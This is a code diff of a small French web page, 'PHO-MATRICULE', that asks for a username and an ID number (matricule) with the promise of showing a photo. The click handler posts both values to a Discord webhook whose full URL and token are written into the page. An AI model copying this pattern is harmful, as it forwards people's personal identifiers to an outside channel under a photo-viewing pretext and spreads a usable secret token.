@@ -5,10 +5,10 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>PHO-MATRICULE</title>
+
     <style>
       body {
         font-family: Arial, sans-serif;
-        background: #f2f2f2;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -17,31 +17,35 @@
         background-size: cover;
         background-position: center;
       }
+
       .box {
-        background: white;
         padding: 30px;
         border-radius: 12px;
-        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
         width: 330px;
-        justify-content: center;
         text-align: center;
         background-color: rgb(67, 65, 170);
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
       }
+
       .box h2 {
         color: rgb(81, 107, 255);
         padding: 15px;
       }
-      textarea {
+
+      textarea,
+      input {
         width: 90%;
-        height: 12px;
         padding: 10px;
         border-radius: 8px;
         border: 1px solid #ccc;
-        resize: none;
         margin-bottom: 15px;
-        justify-content: center;
       }
+
+      textarea {
+        height: 12px;
+        resize: none;
+      }
+
       button {
         width: 100%;
         padding: 12px;
@@ -52,15 +56,33 @@
         cursor: pointer;
         font-size: 16px;
       }
+
       button:hover {
         background: #4752c4;
       }
+
+      #status {
+        margin-top: 10px;
+        font-weight: bold;
+      }
+
+      #info {
+        margin-top: 15px;
+        color: white;
+        font-size: 14px;
+        opacity: 0.8;
+      }
     </style>
   </head>
+
   <body>
     <div class="box">
       <h2>PHO-MATRI</h2>
 
+      <!-- Champ nom d'utilisateur -->
+      <input id="username" placeholder="Nom d'utilisateur..." />
+
+      <!-- Champ matricule -->
       <textarea
         id="message"
         placeholder="Écris ton matricule ici..."
@@ -68,17 +90,35 @@
 
       <button onclick="sendMessage();ouvrirpage();">VOIR PHOTO</button>
 
+      <!-- ⭐ Message demandé -->
+      <p id="info">
+        Si vous ne voyez pas de photo, alors la vôtre n'est pas encore
+        disponible.
+      </p>
+
       <p id="status"></p>
     </div>
+
     <script>
       const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1375850659475357764/t6bGQnwd60BEYiNp2YCPQrxOSjQbsw_f4Mf3r5JSX43vyZWMhOdehlKzQ6M2keJcYUqo";
+
+      // Vérification du matricule : 8 chiffres + 1 lettre
+      function isValidMatricule(mat) {
+        const regex = /^[0-9]{8}[A-Za-z]$/;
+        return regex.test(mat);
+      }
 
       function ouvrirpage() {
         const mat = document.getElementById("message").value.trim();
 
         if (!mat) {
-          alert("matricule !");
+          alert("Veuillez entrer un matricule !");
+          return;
+        }
+
+        if (!isValidMatricule(mat)) {
+          alert("❌ Format incorrect ! Exemple : 10123321L");
           return;
         }
 
@@ -88,10 +128,24 @@
 
       function sendMessage() {
         const message = document.getElementById("message").value.trim();
+        const username = document.getElementById("username").value.trim();
         const status = document.getElementById("status");
 
         if (!message) {
-          status.innerHTML = "⚠️ Le message est vide.";
+          status.innerHTML = "⚠️ Le matricule est vide.";
+          status.style.color = "red";
+          return;
+        }
+
+        if (!isValidMatricule(message)) {
+          status.innerHTML =
+            "❌ Format incorrect ! Exemple : <b>19472803L</b>";
+          status.style.color = "red";
+          return;
+        }
+
+        if (!username) {
+          status.innerHTML = "⚠️ Le nom d'utilisateur est vide.";
           status.style.color = "red";
           return;
         }
@@ -102,14 +156,17 @@
             "Content-Type": "application/json",
           },
           body: JSON.stringify({
-            content: message,
+            content:
+              `👤 **Utilisateur :** ${username}\n` +
+              `🔢 **Matricule :** ${message}`,
           }),
         })
           .then((res) => {
             if (res.ok) {
               status.innerHTML = "✔️ Message envoyé avec succès !";
-              status.style.color = "green";
+              status.style.color = "lightgreen";
               document.getElementById("message").value = "";
+              document.getElementById("username").value = "";
             } else {
               status.innerHTML = "❌ Erreur lors de l’envoi.";
               status.style.color = "red";
@@ -123,4 +180,3 @@
     </script>
   </body>
 </html>
-
